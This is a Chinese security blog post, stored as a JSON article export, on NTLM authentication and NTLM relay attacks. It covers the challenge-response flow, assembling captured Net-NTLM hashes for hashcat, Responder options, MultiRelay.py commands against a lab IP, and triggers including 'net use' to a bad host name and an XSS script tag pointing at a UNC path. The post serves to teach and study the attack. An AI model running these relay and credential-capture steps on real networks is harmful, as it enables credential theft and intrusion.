{"title":"NTLM-Relay攻击","uid":"87b274fadad0a6b05fd4814550be9f11","slug":"NTLM-Relay攻击","date":"2023-05-24T04:12:28.000Z","updated":"2023-05-25T08:06:43.763Z","comments":true,"path":"api/articles/NTLM-Relay攻击.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F31%2F20150531134332_s4dxn.thumb.700_0.jpeg&refer=http%3A%2F%2Fb-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1687593990&t=c2298c6d35596afce3b266d2ab766151","content":"<h1 id=\"前言介绍\"><a href=\"#前言介绍\" class=\"headerlink\" title=\"前言介绍\"></a>前言介绍</h1><p> NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。</p>\n<p>而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。</p>\n<h3 id=\"NTLM协议介绍\"><a href=\"#NTLM协议介绍\" class=\"headerlink\" title=\"NTLM协议介绍\"></a>NTLM协议介绍</h3><p>NTLM协议分为几个部分。 协商、挑战、认证。也叫做挑战响应机制。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">协商：这个是为了解决历史遗留问题，为了向下兼容设计，双方协定一下传输的版本号等各种信息，版本主要分为V1和V2两个版本。\n挑战：如下图。\n认证：对质问结果的验证，验证通过后即可访问资源。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525102437832.png\" alt=\"image-20230525102437832\"></p>\n<h3 id=\"工作组中进行挑战过程：（Netlogon协议）\"><a href=\"#工作组中进行挑战过程：（Netlogon协议）\" class=\"headerlink\" title=\"工作组中进行挑战过程：（Netlogon协议）\"></a>工作组中进行挑战过程：（Netlogon协议）</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">（1）客户端向服务器发出登陆请求。\t\n（2）服务器返回一个challenge，包含一个随机数和一个称为realm的字符串。\n（3）客户端使用账号密码和challenge计算出一个respose，然后发送给服务器。\n（4）服务器使用账号密码计算出来一个expected-respose。\n（5）服务器将生成的expected-respose和repose进行对比，如果一致则认证通过。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525103523387.png\" alt=\"image-20230525103523387\"></p>\n<h3 id=\"域环境挑战全过程：\"><a href=\"#域环境挑战全过程：\" class=\"headerlink\" title=\"域环境挑战全过程：\"></a>域环境挑战全过程：</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1.由于域机器中的SAM文件中，不存在域内用户的hash值，所以域内机器将客户端的username、challenge、repose通过netlogon协议交到域控手中，让域控进行身份认证。\n2.域控通过客户端用户名在自己的ntds.dit中进行寻找，用challenge进行加密，再和net-ntlm-hash进行对比，返回结果给域机器\n3.服务器根据DC的结果成功与否返回给客户端<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"本地抓包测试\"><a href=\"#本地抓包测试\" class=\"headerlink\" title=\"本地抓包测试\"></a>本地抓包测试</h3><p>这里起了两个windows虚拟机，这里左侧已经连接上去，这里wireshark看下流量包</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525131209344.png\" alt=\"image-20230525131209344\"></p>\n<p>这里wireshark抓到smb2的数据包</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525132706115.png\" alt=\"image-20230525132706115\"></p>\n<p>这里可以看到172.16.165.130是相当于登陆机器，由于是非域内环境，所以只能按照本地网络认证的过程来执行，这里会先进行协商，确定版本号，然后进行challenge。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525133132283.png\" alt=\"image-20230525133132283\"></p>\n<p>这里服务端会向客户端返回16位的随机数challenge。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525133230534.png\" alt=\"image-20230525133230534\"></p>\n<p>然后客户端向要登陆的主机发送用户名对应的NTLMHASH对challenge进行加密得到的Respose。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525133401919.png\" alt=\"image-20230525133401919\"></p>\n<p>将获取到的Respose进行Net-NTLMhash格式的拼接。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">NET-NTLMhash格式：\n username:domain:challenge:HMAC-MD5:blob\n \n详细说明一下各个数据的获取：\nusername和domain都可以从下图过程中进行获\nHMAC-MD5为NTProofStr部分（正在username和domain获取中得到）\nblob就是Response中除NTProofStr剩下的部分<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"username、domain的获取\"><a href=\"#username、domain的获取\" class=\"headerlink\" title=\"username、domain的获取\"></a>username、domain的获取</h6><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525135204943.png\" alt=\"image-20230525135204943\"></p>\n<p>所以当你拼接完成之后，就可以用hashcat来进行解密完成密码的获取。</p>\n<h3 id=\"NTLM-Relay前置知识\"><a href=\"#NTLM-Relay前置知识\" class=\"headerlink\" title=\"NTLM-Relay前置知识\"></a>NTLM-Relay前置知识</h3><h4 id=\"windows系统名称的解析顺序\"><a href=\"#windows系统名称的解析顺序\" class=\"headerlink\" title=\"windows系统名称的解析顺序\"></a>windows系统名称的解析顺序</h4><p>当我们访问一个共享时， net use \\aa 其寻找这个主机名会按顺序来进行查找。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">（1）本地的host文件\n（2）DNS的缓存\\DNS服务器\n（3）链路本地多播和NetBios名称服务<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>如果在1、2中没有找到，系统就会通过链路本地多播名称解析和NetBios名称服务在本地名称解析。这个时候，客户端就会将未经过认证的UDP广播到网络中，询问他是否是本地系统的服务，由于改过程未经过认证，并未广播到整个网络中，从而允许网络上的任何机器响应并声称是这台机器。</p>\n<p>因为当用户输入的不存在、包含错误或者DNS中没有主机名的时候，通过responder工具监听链路本地多播名称解析和Net-BIOS广播，就可以伪装目标机器，从而让受害者交凭证。</p>\n<h4 id=\"responder攻击详解\"><a href=\"#responder攻击详解\" class=\"headerlink\" title=\"responder攻击详解\"></a>responder攻击详解</h4><p>Responder工具是一款用于中间人攻击的工具，他可以用于监听本地网络并获取许多凭证，例如NTLM和kerberos凭证。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">--version             显示程序版本并退出\n-h, --help            显示帮助信息并退出\n-A, --analyze         分析模式。此选项允许您查看NBT-NS、BROWSER、LLMNR请求，而无需响应。\n-I eth0, --interface&#x3D;eth0\n要使用的网络接口，可以使用“ALL”作为通配符来表示所有接口\n-i 10.0.0.21, --ip&#x3D;10.0.0.21\n要使用的本地IP（仅适用于OSX）\n-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6&#x3D;2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed\n使用与Responder的IPv6地址不同的另一个IPv6地址扰乱所有请求。\n-e 10.0.0.22, --externalip&#x3D;10.0.0.22\n使用与Responder的IP地址不同的另一个IP地址扰乱所有请求。\n-b, --basic           返回基本的HTTP身份验证。默认值：NTLM\n-d, --DHCP            启用对DHCP广播请求的答复。此选项将在DHCP响应中注入WPAD服务器。默认值：False\n-D, --DHCP-DNS        此选项将在DHCP响应中注入DNS服务器，否则将添加WPAD服务器。默认值：False\n-w, --wpad            启动WPAD恶意代理服务器。默认值为False\n-u UPSTREAM_PROXY, --upstream-proxy&#x3D;UPSTREAM_PROXY\nWPAD代理的上游HTTP代理用于发出请求（格式：host:port）\n-F, --ForceWpadAuth   强制进行wpad.dat文件检索的NTLM&#x2F;Basic身份验证。这可能会导致登录提示。默认值：False\n-P, --ProxyAuth       强制NTLM（透明）&#x2F; Basic（提示）身份验证进行代理。不需要启用WPAD。此选项非常有效。默认值：False\n--lm                  强制Windows XP&#x2F;2003及更早版本使用LM哈希降级。默认值：False\n--disable-ess         强制ESS降级。默认值：False\n-v, --verbose         增加详细程度。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"NTLM-Relay攻击\"><a href=\"#NTLM-Relay攻击\" class=\"headerlink\" title=\"NTLM-Relay攻击\"></a>NTLM-Relay攻击</h3><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525145757520.png\" alt=\"image-20230525145757520\"></p>\n<p>最重要的意思，攻击者利用网络监听或者其他方式盗取认证凭据，之后再重新把他发送给server。</p>\n<h4 id=\"实战操作\"><a href=\"#实战操作\" class=\"headerlink\" title=\"实战操作\"></a>实战操作</h4><p>这里下载responder，输入命令</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">python3 responder -I etho -f <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>受害机器执行操作</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525151346553.png\" alt=\"image-20230525151346553\"></p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525151549150.png\" alt=\"image-20230525151549150\"></p>\n<p>成功收到ntlm的hash值，但是这个是比较鸡肋的，当我们破解不出来密码的时候就显得没有作用。</p>\n<h4 id=\"另类的NTLM-Repay\"><a href=\"#另类的NTLM-Repay\" class=\"headerlink\" title=\"另类的NTLM-Repay\"></a>另类的NTLM-Repay</h4><p>但是我们可以将凭证中继到其他主机上去，如果在域内的权限足够大，则可以中继到其他主机上去，获取其他主机权限，但是不能relay到真实的主机上去。但是也有一定的前提条件，就是目标主机不能开启smb签名。一般在域内，域控默认打开smb签名，但是域内的机器是不打开smb签名的。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Lanmanworkstation\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>（1）使用脚本进行探测Runfinger脚本探测主机：</p>\n<p>使用responder&#x2F;tools文件夹下的有一款工具叫做RunFinder工具，这里用它来进行内网探测哪台主机可以使用NTLM-Relay攻击，但是这里的runfinger只能在域内进行使用，由于环境限制，我就再进行探测。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">注意事项：\n即使有一个主机，你知道可以进行攻击，但是没有被runfinger显示出来，也不可以进行攻击。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>（2）修改responder的配置文件responder.conf，不让其对hash进行抓取。将SMB和HTTP的ON改为Off：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">vim &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>（3）开启responder的监听</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">responder -I eth0 -v<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>（4）启动MultiRelay.py</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools\npython3 MultiRelay.py -t  要攻击的域内目标  -u ALL\npython3 MultiRelay.py -t 192.168.52.171 -u ALL\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"ntlm-relay的触发方式\"><a href=\"#ntlm-relay的触发方式\" class=\"headerlink\" title=\"ntlm-relay的触发方式\"></a>ntlm-relay的触发方式</h3><p>只有域中其他用户访问了一个错误的主机，那么我们作为攻击者就可以触发可以进行NTLM-relay攻击。</p>\n<h5 id=\"通过http协议触发\"><a href=\"#通过http协议触发\" class=\"headerlink\" title=\"通过http协议触发\"></a>通过http协议触发</h5><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525155340591.png\" alt=\"image-20230525155340591\"></p>\n<h5 id=\"通过SMB协议触发\"><a href=\"#通过SMB协议触发\" class=\"headerlink\" title=\"通过SMB协议触发\"></a>通过SMB协议触发</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">net use \\\\错误的名称<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230525155725034.png\" alt=\"image-20230525155725034\"></p>\n<h5 id=\"收集到的奇怪的触发方式\"><a href=\"#收集到的奇怪的触发方式\" class=\"headerlink\" title=\"收集到的奇怪的触发方式\"></a>收集到的奇怪的触发方式</h5><p>通过xss来进行触发</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;script src&#x3D;\\\\aa&gt;&lt;&#x2F;script&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n","text":"前言介绍 NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。 而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。 NTLM协议...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">前言介绍</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#NTLM%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">NTLM协议介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%8C%91%E6%88%98%E8%BF%87%E7%A8%8B%EF%BC%9A%EF%BC%88Netlogon%E5%8D%8F%E8%AE%AE%EF%BC%89\"><span class=\"toc-text\">工作组中进行挑战过程：（Netlogon协议）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8C%91%E6%88%98%E5%85%A8%E8%BF%87%E7%A8%8B%EF%BC%9A\"><span class=\"toc-text\">域环境挑战全过程：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E6%8A%93%E5%8C%85%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">本地抓包测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#username%E3%80%81domain%E7%9A%84%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">username、domain的获取</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#NTLM-Relay%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">NTLM-Relay前置知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#windows%E7%B3%BB%E7%BB%9F%E5%90%8D%E7%A7%B0%E7%9A%84%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F\"><span class=\"toc-text\">windows系统名称的解析顺序</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#responder%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3\"><span class=\"toc-text\">responder攻击详解</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#NTLM-Relay%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">NTLM-Relay攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\">实战操作</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%A6%E7%B1%BB%E7%9A%84NTLM-Repay\"><span class=\"toc-text\">另类的NTLM-Repay</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ntlm-relay%E7%9A%84%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">ntlm-relay的触发方式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%80%9A%E8%BF%87http%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91\"><span class=\"toc-text\">通过http协议触发</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%80%9A%E8%BF%87SMB%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91\"><span class=\"toc-text\">通过SMB协议触发</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84%E5%A5%87%E6%80%AA%E7%9A%84%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">收集到的奇怪的触发方式</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"关于nps工具的魔改","uid":"badd5d9a02640c51cb699c12c4298740","slug":"关于nps工具的魔改","date":"2023-05-26T07:52:53.000Z","updated":"2023-08-16T15:33:24.248Z","comments":true,"path":"api/articles/关于nps工具的魔改.json","keywords":null,"cover":"https://k.sinaimg.cn/n/sinacn10110/470/w1170h900/20190411/7c33-hvntnkq4891892.jpg/w700d1q75cms.jpg","text":"免责声明🧐[]: 本工具仅面向 合法授权 的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。 在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。 如您在使用本工具的过程中存在任何非法行为，您需自行承担相...","link":"","photos":[],"count_time":{"symbolsCount":"1.7k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"工具魔改","slug":"工具魔改","count":1,"path":"api/tags/工具魔改.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"关于某次授权的大型内网渗透测试","uid":"6926437034a0cc884741b3438fbe3704","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","updated":"2023-05-25T09:23:15.776Z","comments":true,"path":"api/articles/关于某次授权的大型内网渗透测试.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F201508%2F04%2F20150804082536_YVK5n.thumb.1000_0.jpeg&refer=http%3A%2F%2Fc-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1687593990&t=86abed9188b13acd40e510f56ed95a01","text":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。 背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。 前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。 ta...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}}}}